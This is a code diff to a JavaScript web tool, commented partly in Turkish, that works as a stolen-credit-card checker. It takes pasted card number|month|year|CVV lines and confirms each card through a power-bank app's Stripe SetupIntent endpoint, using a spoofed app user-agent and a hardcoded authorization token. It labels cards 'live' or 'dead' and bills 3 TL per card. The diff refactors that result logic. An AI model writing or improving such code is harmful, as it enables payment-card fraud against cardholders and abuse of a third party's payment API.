@@ -172,6 +172,7 @@
     }
 
     function updateRadioUI() {
+        const radioToggle = $('radioToggle');
         if (radioToggle) {
             radioToggle.innerHTML = isMusicPlaying ? '<i class="fas fa-music"></i>' : '<i class="fas fa-music-slash"></i>';
             radioToggle.classList.toggle('active', isMusicPlaying);
@@ -186,7 +187,7 @@
     if (radioPrev) radioPrev.addEventListener('click', prevSong);
     if (radioNext) radioNext.addEventListener('click', nextSong);
 
-    // ---- BIN API (YENİ) ----
+    // ---- BIN API ----
     async function lookupBIN(bin) {
         try {
             const response = await fetch('https://bin-api-worker.aninnayem-an.workers.dev/bin/' + bin);
@@ -306,7 +307,7 @@
         return '<i class="fas fa-credit-card logo" style="color:var(--text-muted);"></i>';
     }
 
-    // ---- STRIPE AUTH ----
+    // ---- STRIPE AUTH (YENİ, SAĞLAM) ----
     function formatCCStripe(line) {
         try {
             const parts = line.split(/[|/,\s]+/).filter(p => p.length > 0);
@@ -326,6 +327,7 @@
         try {
             const authToken = 'Possessor 1I1/xy0GbbDYwK5xkCXVxANB+NryBfyb17Wyqph2LyBehTPQ/2Za96UQi2CC3+NRDN2GCelfjjKXnxt77Bkp31OsHImCIVCedbXB+LCn8a2g4qQaLFFwSH3W9txaXhHJJcCZez1XzZ9Ceae+WoyjyLrjx/i3G20JUe+JalsAOcNqmv5bFrFXnWHK+0Cv5Me8xqTehJKekS1ykD6IbO6+s+k19WSiuTupXLT8ukPSUQc04IkDIOzoJVLFJRmrC+onZ7I6BWFWSaP27qddLdssE4plPAgdIiH6pCXbVDZCW2a+pQVA1IUiZAdYdLSLUA8/bG03JFuQ/WE/1axeUqujZCNzxpnvu30cN11LQCBjNtjuugBH7yOanNO9t9DIgGKmlabVUatpX3dEP+ceyimRkDIceHmLwUDVJpTVtqgYgIje6ELTniGXsCOY0i501fLFFocg9me6cSnn9eHPcFgXXbmuIpHUW6342fyxhai3pDCADyAEEGI6esi7GSxv2kIUX6q+5g/vDHR9Rn4v3HpWjXuCMs+wIw95+a4ZeEPBEaQ4uPeIFBAQ/4A9OmhWQV7gQ1f6BQnL8m8rFng8qr7O0/sqRo/PEutKWrBc6F19DyjJ4X7lhXIkoV8gFJmbcCfogwgkn/g15meQmm3Q6s+pmGqktTXoeeiZN6MZJSvwoHla/sqVnU3T6kymP5F+YexTNMuTahioNpe3Nw0xl4TbOwhPahPbxPZdg+o8SUsVTEma29DeGJpbm9yrQOBKxkXHtxSCQ8EsIWe/2YEGQoS/OSlvjPLAxjOdF1gZAvteSZym+ivBZPeOWO/oPnmynTHoY+fHBn1rzxI2qhtRYOpaxjJk4Y+VNdfRSiX9y4DPUdIBISgim4p30sYjNQxSnufXsJyDHEhuWxyr1Zc8oGRCeLX7omb/rkH8+361TFFHyAu4RPqJAnpWrPpFWe1nU99VvrE8cf7J94o01kalK9MmeDJiI+JuJ4+31cEQ4xtjJqlqgLfEZ1etNP1gIPl+Pfzx';
 
+            // Step 1: Create SetupIntent
             const urlCreate = 'https://vibz.stwpower.com/power_bank/api/bankcard/stripe/createSetupIntent?language=ger';
             const headersCreate = {
                 'User-Agent': 'VIBZ/1 CFNetwork/3826.600.41 Darwin/24.6.0',
@@ -343,11 +345,12 @@
             const textCreate = await respCreate.text();
             const match = textCreate.match(/(seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)/);
             if (!match) {
-                return '❌ Declined! (client_secret not found)';
+                return { status: 'dead', message: '❌ Declined! (client_secret not found)' };
             }
             const clientSecret = match[1];
             const intentId = clientSecret.split('_secret_')[0];
 
+            // Step 2: Confirm SetupIntent
             const urlConfirm = `https://api.stripe.com/v1/setup_intents/${intentId}/confirm`;
             const payload = new URLSearchParams();
             payload.append('client_secret', clientSecret);
@@ -381,19 +384,21 @@
 
             if (json.error) {
                 const msg = json.error.message || 'Unknown error';
-                return `❌ Declined! (${msg})`;
+                return { status: 'dead', message: `❌ Declined! (${msg})` };
             }
 
             const status = json.status;
+            
+            // ---- STATUS KONTROLÜ (TAM İSTEDİĞİN GİBİ) ----
             if (status === 'succeeded') {
-                return '✅ Approved! (AUTHED)';
+                return { status: 'live', message: '✅ Approved! (AUTHED)' };
             } else if (status === 'requires_action' || status === 'requires_source_action') {
-                return '🔐 3D Secure! (3DS)';
+                return { status: 'live', message: '🔐 3D Secure! (3DS)' };
             } else {
-                return `❌ Declined! (UNKNOWN STATUS - ${status})`;
+                return { status: 'dead', message: `❌ Declined! (DEAD)` };
             }
         } catch (err) {
-            return `❌ Error: ${err.message.slice(0, 50)}`;
+            return { status: 'dead', message: `❌ Error: ${err.message.slice(0, 50)}` };
         }
     }
 
@@ -403,8 +408,8 @@
     function renderStripeResults(filter = 'all') {
         let filtered = [];
         if (filter === 'all') filtered = stripeResults;
-        else if (filter === 'live') filtered = stripeResults.filter(r => r.status.includes('Approved') || r.status.includes('3D Secure'));
-        else if (filter === 'dead') filtered = stripeResults.filter(r => !r.status.includes('Approved') && !r.status.includes('3D Secure'));
+        else if (filter === 'live') filtered = stripeResults.filter(r => r.status === 'live');
+        else if (filter === 'dead') filtered = stripeResults.filter(r => r.status === 'dead');
 
         if (!filtered.length) {
             stripeResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;">No results.</div>';
@@ -412,11 +417,11 @@
         }
         let html = '';
         filtered.forEach(r => {
-            const statusColor = r.status.includes('Approved') || r.status.includes('3D Secure') ? '#34c759' : '#ff3b30';
+            const statusColor = r.status === 'live' ? '#34c759' : '#ff3b30';
             html += `
                 <div style="padding:4px 0;border-bottom:1px solid var(--border-color);display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;">
                     <span style="font-family:monospace;">Card: ${r.cc}|${r.mm}|${r.yy}|${r.cvv}</span>
-                    <span style="font-weight:600;color:${statusColor};">Resp: ${r.status}</span>
+                    <span style="font-weight:600;color:${statusColor};">Resp: ${r.message}</span>
                 </div>
             `;
         });
@@ -424,8 +429,8 @@
     }
 
     function updateStripeCounts() {
-        const live = stripeResults.filter(r => r.status.includes('Approved') || r.status.includes('3D Secure')).length;
-        const dead = stripeResults.length - live;
+        const live = stripeResults.filter(r => r.status === 'live').length;
+        const dead = stripeResults.filter(r => r.status === 'dead').length;
         liveCount.textContent = live;
         deadCount.textContent = dead;
         totalCount.textContent = stripeResults.length;
@@ -466,7 +471,7 @@
         });
     }
 
-    // ---- STRIPE CHECK (DÜZELTİLDİ) ----
+    // ---- STRIPE CHECK (DÜZELTİLDİ - CHECKING KALKAR) ----
     if (stripeCheckBtn) {
         stripeCheckBtn.addEventListener('click', async function() {
             const lines = stripeInput.value.split('\n').map(l => l.trim()).filter(l => l);
@@ -479,6 +484,7 @@
             }
 
             stripeResults = [];
+            // Checking yazısını göster
             stripeResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;font-weight:600;">⏳ Checking...</div>';
             this.disabled = true;
             this.textContent = '⏳ Checking...';
@@ -487,12 +493,16 @@
                 for (const line of lines) {
                     const formatted = formatCCStripe(line);
                     if (!formatted) {
-                        stripeResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: '❌ Format Error' });
+                        stripeResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: 'dead', message: '❌ Format Error' });
                         continue;
                     }
                     const { cc, mm, yy, cvv } = formatted;
                     const result = await stripeAuthCheck(cc, mm, yy, cvv);
-                    stripeResults.push({ cc, mm, yy, cvv, status: result });
+                    stripeResults.push({ 
+                        cc, mm, yy, cvv, 
+                        status: result.status, 
+                        message: result.message 
+                    });
                     updateStripeCounts();
                     renderStripeResults('all');
                 }
@@ -511,9 +521,8 @@
                 this.disabled = false;
                 this.textContent = '▶️ Start Check (3 TL/card)';
 
-                // CHECKING YAZISI KALDIRILDI - Sonuçları göster
+                // Sonuçları göster - CHECKING YAZISI KALKTI
                 updateStripeCounts();
-                stripeResult.innerHTML = '';
                 renderStripeResults('all');
                 showToast(`✅ Checked ${lines.length} cards. Cost: ${cost} TL deducted.`, 'success');
             }
@@ -692,6 +701,7 @@
         });
     }
 
+    // ---- COPY ALL ----
     if (copyAllBtn) {
         copyAllBtn.addEventListener('click', function() {
             const items = ccList.querySelectorAll('div > span:first-child');
@@ -738,7 +748,7 @@
         ccValidateInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') validateBtn.click(); });
     }
 
-    // ---- BIN (YENİ API) ----
+    // ---- BIN ----
     const binInput = $('binInput');
     const binSorguBtn = $('binSorguBtn');
     const binResult = $('binResult');
